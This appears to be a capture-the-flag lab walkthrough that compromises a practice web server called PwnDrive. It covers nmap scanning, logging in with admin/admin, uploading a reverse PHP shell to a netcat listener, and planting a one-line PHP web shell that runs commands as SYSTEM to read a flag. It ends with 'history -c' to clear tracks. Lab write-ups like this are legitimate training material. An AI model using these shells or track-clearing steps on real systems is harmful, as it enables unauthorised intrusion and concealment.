**1.  Reconnaissance**

        nmap -sn 10.150.150.0/24
  <img width="940" height="678" alt="image" src="https://github.com/user-attachments/assets/1e2efe5d-ccdf-4130-b54b-bbf6ac0cbe89" />

  Identified 10.150.150.11 as the active target for the next stage.
  

**2.  Scanning**

        sudo nmap -sC -sV -Pn -vv 10.150.150.11
    <img width="940" height="676" alt="image" src="https://github.com/user-attachments/assets/2e5bf773-3bb6-42a0-88bb-de7a605d12da" />

  Identified Port 80 running Apache httpd 2.4.46. This confirmed that a web server was active.
  

**3.  Gain Access**

   <img width="920" height="534" alt="image" src="https://github.com/user-attachments/assets/5a7388cd-1410-4421-bdd8-f28e05f1d8ca" />

  Opening the website http://101.150.150.11 and clicking on the Sign In button.
  

  <img width="919" height="541" alt="image" src="https://github.com/user-attachments/assets/e1c7825b-d37b-46ac-80ba-c613f21ce2cd" />

  Tried some common usernames and passwords and successfully logged in with ‘admin’ as both username and password.
  

        /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/Shell.php

<img width="940" height="386" alt="image" src="https://github.com/user-attachments/assets/11510fe7-ca36-41c8-b1bb-3fc96c093085" />

  Copied the PHP web shell from the /usr/share/webshells/ directory to the Desktop to prepare for the upload on the website.
  

         ip addr show tun0

<img width="940" height="679" alt="image" src="https://github.com/user-attachments/assets/670f977f-0545-4f77-bd8d-c8024dc69d49" />

  Checked the tun0 IP address to verify the active OpenVPN connection. Then, configured the reverse shell payload by updating the $ip and $port variables to match the attacker’s listener settings.
  

<img width="940" height="471" alt="image" src="https://github.com/user-attachments/assets/6390e560-8217-4fa6-acbb-ef095a26e802" />

  Uploaded the configured shell.php payload to the PwnDrive web server.
  

**4.  Maintain Access**

         nc -lvnp 1234
    
<img width="940" height="110" alt="image" src="https://github.com/user-attachments/assets/eac14d34-8482-431a-b77a-1f71e36f4288" />

  Started a Netcat listener on port 1234 to catch the reverse shell connection.
  

<img width="923" height="484" alt="image" src="https://github.com/user-attachments/assets/21a8bb53-440a-4639-bf67-8f97a01c87c8" />

  Opened http://10.150.150.11/upload/2/shell.php and checked the nc -lvnp 1234 result to ensure it was listening and received the connection.
  

         <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>

<img width="531" height="140" alt="image" src="https://github.com/user-attachments/assets/a070af92-a0f7-4933-bf2a-0f34b596ffd6" />

  Created a simple PHP web shell (cmd.php) to allow Remote Code Execution (RCE) via the browser and saved it to the Desktop. Then, upload it to the PwnDrive.
  

**5.  Escalate Privileges**

<img width="940" height="505" alt="image" src="https://github.com/user-attachments/assets/3fbf583f-77bd-406b-a0f1-f7f92cfbc3fe" />

  Executed the whoami command via the web shell to verify current privileges. The result confirmed nt authority\\system access, indicating fully administrative control over the target.
  
<img width="913" height="506" alt="image" src="https://github.com/user-attachments/assets/cc9482ee-c7e7-4243-b3c3-420d1f60408f" />

  Use dir /s c:\*.txt to locate sensitive files. Identified FLAG1.txt on the Administrator’s Desktop.

          http://10.150.150.11/upload/2/cmd.php?cmd=type C:\\Users\\Administrator\\Desktop\\FLAG1.txt
          
<img width="940" height="583" alt="image" src="https://github.com/user-attachments/assets/f9db7c2d-5f96-4c8f-93b8-505e4edc0004" />

  Executed the type command to read the contents of the flag on the Administrator’s Desktop. Successfully captured FLAG1.txt, completing the exploitation.

**6.  Clear Tracks**

          history -c
